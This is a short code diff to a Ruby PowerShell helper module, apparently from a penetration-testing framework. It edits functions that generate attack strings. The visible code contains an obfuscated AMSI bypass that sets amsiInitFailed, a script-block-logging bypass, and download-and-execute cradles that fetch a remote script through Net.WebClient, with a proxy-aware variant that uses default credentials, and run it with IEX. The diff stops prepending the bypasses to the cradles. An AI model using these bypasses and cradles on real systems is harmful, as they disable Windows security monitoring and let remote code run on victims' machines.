@@ -93,7 +93,7 @@ module Powershell
       %q{
         $Ref=[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils');
         $Ref.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true);
-      }.gsub(/\s+/, " ").strip
+      }
     end
 
     #
@@ -116,7 +116,7 @@ module Powershell
         } Else {
             [ScriptBlock].GetField('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
         }
-      }.gsub(/\s+/, " ").strip
+      }
     end
 
     #
@@ -129,7 +129,7 @@ module Powershell
           #{self.bypass_script_log}
           #{self.bypass_amsi}
         }
-      }.gsub(/\s+/, " ").strip
+      }
     end
 
     #
@@ -141,9 +141,9 @@ module Powershell
     # @return [String] PowerShell code to download and exec the url
     def self.download_and_exec_string(url, iex = true)
       if iex
-        %Q^#{self.bypass_powershell_protections}IEX ((new-object Net.WebClient).DownloadString('#{url}'))^
+        %Q^IEX ((new-object Net.WebClient).DownloadString('#{url}'))^
       else
-        %Q^#{self.bypass_powershell_protections}&([scriptblock]::create((new-object Net.WebClient).DownloadString('#{url}')))^
+        %Q^&([scriptblock]::create((new-object Net.WebClient).DownloadString('#{url}')))^
       end
     end
 
@@ -157,8 +157,7 @@ module Powershell
     # @return [String] PowerShell code to download a URL
     def self.proxy_aware_download_and_exec_string(url, iex = true)
       var = Rex::Text.rand_text_alpha(1)
-      cmd = self.bypass_powershell_protections
-      cmd << "$#{var}=new-object net.webclient;"
+      cmd = "$#{var}=new-object net.webclient;"
       cmd << "$#{var}.proxy=[Net.WebRequest]::GetSystemWebProxy();"
       cmd << "$#{var}.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
       if iex
